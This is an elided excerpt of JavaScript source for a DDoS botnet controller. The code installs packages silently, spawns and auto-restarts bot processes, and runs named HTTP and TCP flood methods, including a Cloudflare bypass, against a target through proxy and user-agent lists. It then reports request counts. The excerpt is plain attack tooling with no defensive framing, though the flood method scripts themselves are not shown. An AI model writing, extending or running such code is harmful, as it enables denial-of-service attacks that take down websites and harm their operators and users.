...
// ========== BOT CONFIG ==========
const BOT_ID = '${BOT_ID_PLACEHOLDER}';
...
async function installNpmPackages() {
  ...
  if (missing.length > 0) {
    return new Promise((resolve, reject) => {
      const install = spawn('npm', ['install', ...missing, '--no-save', '--silent'], { stdio: 'pipe', shell: true });
...
function stopAllAttacks() {
  ...
  activeProcesses.forEach(proc => { try { process.kill(-proc.pid); } catch (e) {} });
  activeProcesses = [];
  currentAttack = null;
  requestCount = 0;
}
...
function executeAttack(target, time, methods) {
  ...
  switch(methods) {
    case 'RAPID10':
      execWithLog(\`node methods/r10-rapid.js \${target} \${time} 30 \${proxyFile} \${uaFile}\`);
      execWithLog(\`node methods/r10-tcp.js \${target} \${time} \${proxyFile} \${uaFile}\`);
      execWithLog(\`node methods/r10-tls.js \${target} \${time} \${proxyFile} \${uaFile}\`);
      execWithLog(\`node methods/r10-conn.js \${target} \${time} \${proxyFile} \${uaFile}\`);
      execWithLog(\`node methods/r10-header.js \${target} \${time} 30 \${proxyFile} \${uaFile}\`);
      execWithLog(\`node methods/r10-frag.js \${target} \${time} \${proxyFile} \${uaFile}\`);
      execWithLog(\`node methods/r10-pipe.js \${target} \${time} \${proxyFile} \${uaFile}\`);
      execWithLog(\`node methods/r10-cookie.js \${target} \${time} \${proxyFile} \${uaFile}\`);
      execWithLog(\`node methods/r10-mixed.js \${target} \${time} \${proxyFile} \${uaFile}\`);
      execWithLog(\`node methods/r10-lowcpu.js \${target} \${time} 40 \${proxyFile} \${uaFile}\`);
      break;
    case 'RAW-GET':
      execWithLog(\`node methods/raw-get.js \${target} \${time} 20 800\`);
      break;
    case 'CF-BYPASS':
      execWithLog(\`node methods/cf-bypass.js \${target} \${time} 4 32 \${proxyFile}\`);
      break;
    case 'MODERN-FLOOD':
      execWithLog(\`node methods/modern-flood.js \${target} \${time} 4 64 \${proxyFile}\`);
      break;
    case 'HTTP-SICARIO':
      execWithLog(\`node methods/REX-COSTUM.js \${target} \${time} 32 6 \${proxyFile} --randrate --full --legit --query 1\`);
      execWithLog(\`node methods/cibi.js \${target} \${time} 16 3 \${proxyFile}\`);
      execWithLog(\`node methods/BYPASS.js \${target} \${time} 32 2 \${proxyFile}\`);
      execWithLog(\`node methods/nust.js \${target} \${time} 12 4 \${proxyFile}\`);
      break;
    case 'R9':
      execWithLog(\`node methods/high-dstat.js \${target} \${time} 32 7 \${proxyFile}\`);
      execWithLog(\`node methods/w-flood1.js \${target} \${time} 8 3 \${proxyFile}\`);
      execWithLog(\`node methods/vhold.js \${target} \${time} 16 2 \${proxyFile}\`);
      execWithLog(\`node methods/nust.js \${target} \${time} 16 2 \${proxyFile}\`);
      execWithLog(\`node methods/BYPASS.js \${target} \${time} 8 1 \${proxyFile}\`);
      break;
    case 'R1':
      execWithLog(\`node methods/vhold.js \${target} \${time} 15 2 \${proxyFile}\`);
      execWithLog(\`node methods/high-dstat.js \${target} \${time} 64 2 \${proxyFile}\`);
      execWithLog(\`node methods/cibi.js \${target} \${time} 4 2 \${proxyFile}\`);
      execWithLog(\`node methods/BYPASS.js \${target} \${time} 16 2 \${proxyFile}\`);
      execWithLog(\`node methods/REX-COSTUM.js \${target} \${time} 32 6 \${proxyFile} --randrate --full --legit --query 1\`);
      execWithLog(\`node methods/w-flood1.js \${target} \${time} 8 3 \${proxyFile}\`);
      execWithLog(\`node methods/vhold.js \${target} \${time} 16 2 \${proxyFile}\`);
      execWithLog(\`node methods/nust.js \${target} \${time} 32 3 \${proxyFile}\`);
      break;
    default:
      log(\`Unknown method: \${methods}\`, 'error');
  }

  setTimeout(() => { if (requestCount > 0) sendReport(target, methods, requestCount, time); }, (parseInt(time) * 1000) + 2000);
}
...
class MultiBotController {
  ...
  createBotInstance(index) {
    ...
    let script = createBotScript();
    script = script.replace(/BOT_ID_PLACEHOLDER/g, botId);
    script = script.replace(/BOT_NAME_PLACEHOLDER/g, botName);
  ...
  spawnBot(index) {
    ...
    const tempPath = path.join(__dirname, 'bots', `${bot.id}.js`);
  ...
  run() {
    ...
    setInterval(() => {
      // Monitor processes
      const alive = this.botProcesses.filter(p => p.connected);
      if (alive.length < this.botProcesses.length && this.isRunning) {
        console.log(color(`⚠️ Some bots died. Restarting...`, colors.yellow));
        // Restart dead bots
